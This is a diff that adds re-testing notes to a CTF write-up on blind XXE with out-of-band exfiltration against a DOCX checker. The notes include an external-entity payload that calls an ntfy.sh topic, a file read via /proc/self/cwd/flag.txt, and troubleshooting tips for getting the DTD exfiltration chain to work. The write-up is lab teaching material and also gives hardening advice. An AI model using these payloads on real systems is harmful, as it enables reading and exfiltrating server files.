@@ -248,8 +248,9 @@ span.linenos.special { color: #e6edf3; background-color: #6e7681; padding-left: 
 .codehilite .vm { color: #79C0FF } /* Name.Variable.Magic */
 .codehilite .il { color: #A5D6FF } /* Literal.Number.Integer.Long */
 pre .codehilite, .codehilite pre{background:transparent;border:0;padding:0;margin:0}
-</style></head><body class=""><header class="top"><div class="wrap"><a class="brand" href="../index.html"><span class="dot"></span>YDS CTF <small>writeups</small></a><nav class="top-nav"><a href="../index.html#web" class="on">Web</a><a href="../index.html#crypto">Crypto</a><a href="../index.html#reverse">Reverse</a><a href="../index.html#forensics">Forensics</a><a href="../index.html#android">Mobile</a><a href="../index.html#misc">Misc</a><a href="../index.html#tools">Tooling</a><a href="../index.html">All</a></nav></div></header><article><div class="crumbs"><a href="../index.html">writeups</a> <span>/</span> <a href="../index.html#web">Web</a></div><h1>XXE (medium) — out-of-band exfiltration</h1><p class="tags"><span class="tag">xxe</span><span class="tag">oob</span><span class="tag">docx</span><span class="tag">dtd</span></p><div class="artmeta"><span>xxe-medium.is-course.ru</span><span>1 min read</span><span>140 words</span></div><nav class="toc"><div class="t">On this page</div><ol><li><a href="#recon">Recon</a></li>
+</style></head><body class=""><header class="top"><div class="wrap"><a class="brand" href="../index.html"><span class="dot"></span>YDS CTF <small>writeups</small></a><nav class="top-nav"><a href="../index.html#web" class="on">Web</a><a href="../index.html#crypto">Crypto</a><a href="../index.html#reverse">Reverse</a><a href="../index.html#forensics">Forensics</a><a href="../index.html#android">Mobile</a><a href="../index.html#misc">Misc</a><a href="../index.html#tools">Tooling</a><a href="../index.html">All</a></nav></div></header><article><div class="crumbs"><a href="../index.html">writeups</a> <span>/</span> <a href="../index.html#web">Web</a></div><h1>XXE (medium) — out-of-band exfiltration</h1><p class="tags"><span class="tag">xxe</span><span class="tag">oob</span><span class="tag">docx</span><span class="tag">dtd</span></p><div class="artmeta"><span>xxe-medium.is-course.ru</span><span>2 min read</span><span>387 words</span></div><nav class="toc"><div class="t">On this page</div><ol><li><a href="#recon">Recon</a></li>
 <li><a href="#exploit">Exploit</a></li>
+<li><a href="#re-testing-notes-2026-11-21">Re-testing notes (2026-11-21)</a></li>
 <li><a href="#fix">Fix</a></li></ol></nav><h1 id="xxe-out-of-band">XXE — out-of-band</h1>
 <h2 id="recon" id="recon">Recon</h2>
 <p>The "vegan.docx checker" unzips an uploaded OOXML file and parses <code>word/document.xml</code> with an XML
@@ -278,6 +279,27 @@ never echoes parsed content, so classic in-band XXE is blind — we need OOB.</p
 <p><code>/proc/self/cwd/flag.txt</code> is the reliable path: the flag file is not at a fixed absolute location, but
 the process CWD is the app directory.</p>
 <p>Flag: <code>YDS{…redacted…}</code></p>
+<h2 id="re-testing-notes-2026-11-21" id="re-testing-notes-2026-11-21">Re-testing notes (2026-11-21)</h2>
+<p>The solve above is the one that produced the flag (external DTD on <code>paste.rs</code>, two requests: the DTD
+fetch and the exfiltration fetch). When re-running it against a different sink (an ntfy topic) we could
+reproduce only part of the chain, and the negative detail is worth knowing:</p>
+<ul>
+<li><strong>External general entities are fetched.</strong> A minimal payload
+  <code>&lt;!ENTITY g SYSTEM "https://ntfy.sh/TOPIC/trigger?general=yes"&gt;</code> referenced as <code>&amp;g;</code> produced a
+  request at the sink — so the parser does resolve external entities.</li>
+<li><strong>The parameter-entity DTD chain is fragile.</strong> With the DTD served from GitHub Pages, the parser
+  intermittently returned <code>word/document.xml could not be parsed</code> instead of exfiltrating. Two mundane
+  causes cost us time and are easy to hit:
+  1. a literal <code>%%</code> left in the payload (an unformatted string) makes the subsituted <code>DOCTYPE</code> invalid;
+  2. a DTD that declares <code>%exfil;</code> but never <em>invokes</em> it produces exactly zero requests.</li>
+<li><strong>The flag itself is not URL-safe.</strong> Its braces (<code>{</code>, <code>}</code>) are outside RFC 3986's path/query
+  character set, and a strict URI parser rejects the whole exfiltration entity — hence "could not be
+  parsed" rather than a beacon. A sink that logs raw request lines (or a <code>file://</code> overlay) sidesteps
+  this; ntfy requires a well-formed URL.</li>
+</ul>
+<p>Practical takeaway: test the beacon with a <em>safe</em> file (<code>file:///etc/hostname</code>) before blaming the
+parser, and remember that OOB XXE fails silently at three different stages — DTD fetch, entity
+expansion, and URI serialisation.</p>
 <h2 id="fix" id="fix">Fix</h2>
 <p>Disable external entity resolution (<code>LIBXML_NOENT</code>/<code>XML_PARSE_NONET</code>), or parse with a hardened
 parser (e.g. Go's <code>encoding/xml</code> with <code>Strict</code> and no DTD support).</p><nav class="pager"><a href="gorilla-securecookie.html"><div class="lbl">&larr; previous</div><div class="ttl">Reading (and attacking) gorilla/securecookie sessions</div></a><a class="next" href="aes-ecb.html"><div class="lbl">next &rarr;</div><div class="ttl">AES ECB — byte-at-a-time</div></a></nav></article><footer>YDS CTF writeups &middot; built from Markdown &middot; flags omitted by design</footer>
